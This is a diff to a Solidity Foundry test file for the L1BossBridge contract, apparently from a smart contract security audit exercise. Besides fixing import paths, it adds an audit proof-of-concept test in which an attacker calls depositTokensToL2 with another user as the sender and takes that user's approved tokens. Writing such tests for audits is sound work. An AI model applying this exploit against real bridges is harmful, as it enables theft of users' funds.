@@ -6,9 +6,9 @@ import { ECDSA } from "openzeppelin/contracts/utils/cryptography/ECDSA.sol";
 import { MessageHashUtils } from "openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
 import { Ownable } from "openzeppelin/contracts/access/Ownable.sol";
 import { Pausable } from "@openzeppelin/contracts/utils/Pausable.sol";
-import { L1BossBridge, L1Vault } from "../src/L1BossBridge.sol";
+import { L1BossBridge, L1Vault } from "../../src/L1BossBridge.sol";
 import { IERC20 } from "openzeppelin/contracts/interfaces/IERC20.sol";
-import { L1Token } from "../src/L1Token.sol";
+import { L1Token } from "../../src/L1Token.sol";
 
 contract L1BossBridgeTest is Test {
     event Deposit(address from, address to, uint256 amount);
@@ -222,5 +222,24 @@ contract L1BossBridgeTest is Test {
         returns (uint8 v, bytes32 r, bytes32 s)
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+    }
+
+    ///////////////////////////////////////
+    //           AUDIT-TESTS             //
+    ///////////////////////////////////////
+
+    function testAnybodyCanTransferApprovedTokens() public {
+        address attacker = makeAddr("attacker");
+        uint256 initBalance = token.balanceOf(attacker);
+
+        vm.startPrank(user);
+        uint256 amount = 10e18;
+        token.approve(address(tokenBridge), amount);
+        vm.stopPrank();
+
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, attacker, amount);
+
+        tokenBridge.depositTokensToL2(user, attacker, amount);
     }
 }
